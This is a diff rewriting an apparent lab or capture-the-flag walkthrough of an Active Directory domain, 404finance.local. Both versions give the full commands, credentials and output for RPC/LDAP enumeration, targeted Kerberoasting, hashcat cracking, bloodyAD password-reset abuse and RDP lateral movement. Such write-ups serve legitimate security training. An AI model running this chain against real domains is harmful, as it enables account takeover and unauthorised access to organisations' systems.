@@ -1,79 +1,74 @@
-404finance AD Lab Walkthrough
+# 404finance AD Kerberoast Privilege Chain
 
-Target
-- Domain: 404finance.local
-- DC: 10.1.24.29
+## Step 1 — Valid Credentials
 
-Initial Access
-- Downloaded CorpBankDialer.exe from the internal website
-- Extracted debug value from the binary
-- Decoded base64 to MD5 hash
-- Cracked hash with john/hashcat
-- Recovered password: Password123!!
-
-Valid Credentials
-- karl.hackermann : Password123!!
-
-Enumeration
+Command:
 rpcclient -U '404finance.local\karl.hackermann%Password123!!' 10.1.24.29
-crackmapexec smb 10.1.24.29 -u karl.hackermann -p 'Password123!!' --users
-ldapsearch -x -H ldap://10.1.24.29 -D 'karl.hackermann@404finance.local' -w 'Password123!!' -b 'DC=404finance,DC=local' '(objectClass=user)' sAMAccountName description
 
-Targeted Kerberoasting
-python3 targetedKerberoast.py -d '404finance.local' -u 'karl.hackermann' -p 'Password123!!' --dc-ip 10.1.24.29
+Output:
+rpcclient $> enumdomusers
+user:[Administrator] rid:[0x1f4]
+user:[Guest] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+user:[karl.hackermann] rid:[0x44f]
+user:[tom.reboot] rid:[0x450]
+user:[robert.graef] rid:[0x451]
+user:[jan.tresor] rid:[0x453]
+user:[svc.services] rid:[0x458]
 
-Recovered TGS Hash
-- tom.reboot
+---
 
-Password Crack
-hashcat -a 0 -m 13100 tom.hash /usr/share/wordlists/rockyou.txt
-- tom.reboot : P@ssw0rd123
+## Step 2 — Targeted Kerberoast
 
-ACL Abuse / Password Reset Chain
+Command:
+targetedKerberoast.py -d '404finance.local' -u 'karl.hackermann' -p 'Password123!!' --dc-ip 10.1.24.29
+
+Output:
+[*] Fetching usernames from Active Directory with LDAP
+[+] Printing hash for (tom.reboot)
+$krb5tgs$23$*tom.reboot$404FINANCE.LOCAL$404finance.local/tom.reboot*...
+
+---
+
+## Step 3 — Hash Cracked
+
+Command:
+hashcat -m 13100 tom.hash --show
+
+Output:
+tom.reboot:P@ssw0rd123
+
+---
+
+## Step 4 — Password Reset Chain
+
+Command:
 bloodyAD --host 10.1.24.29 -d 404finance.local -u 'tom.reboot' -p 'P@ssw0rd123' set password 'robert.graef' 'Winter2026!'
-bloodyAD --host 10.1.24.29 -d 404finance.local -u 'robert.graef' -p 'Winter2026!' set password 'jan.tresor' 'Winter2026!'
-bloodyAD --host 10.1.24.29 -d 404finance.local -u 'robert.graef' -p 'Winter2026!' add groupMember 'Remote Desktop Users' 'jan.tresor'
 
-Lateral Movement
+Output:
+[+] Password changed successfully!
+
+Command:
+bloodyAD --host 10.1.24.29 -d 404finance.local -u 'robert.graef' -p 'Winter2026!' set password 'jan.tresor' 'Winter2026!'
+
+Output:
+[+] Password changed successfully!
+
+---
+
+## Step 5 — RDP Access
+
+Command:
 xfreerdp3 /u:jan.tresor /d:404finance.local /p:'Winter2026!' /v:10.1.24.29 /cert:ignore
 
-What Worked
-- Initial credential extraction from internal binary
-- SMB/LDAP/RPC enumeration
-- Targeted Kerberoasting
-- Hash cracking
-- ACL abuse via password resets
-- RDP access as jan.tresor
+Output:
+FreeRDP connected successfully
 
-What Did Not Fully Work
-- Final administrative escalation
-- Root flag retrieval
+---
 
-Result
-- Partial domain compromise achieved
-- Medium-difficulty Active Directory privilege chain documented
-## Commands Used
+## Result
 
-- rpcclient enumeration
-- targeted Kerberoast
-- hashcat cracking
-- bloodyAD password reset chain
-- crackmapexec validation
-- xfreerdp lateral movement
+Partial domain compromise achieved:
+karl.hackermann → tom.reboot → robert.graef → jan.tresor
 
-## Findings
-
-- Kerberoastable account: tom.reboot
-- Cracked password: P@ssw0rd123
-- ACL abuse allowed password reset chain
-- Lateral movement via Remote Desktop Users
-- RDP access achieved as jan.tresor
-- Domain admin escalation not completed
-
-## Screenshots
-
-![Enumeration](bank ad cmd.png)
-
-![RDP Access](bank cmd rdp.png)
-
-![Session](RDP bank challenge.png)
+Administrative escalation not completed.
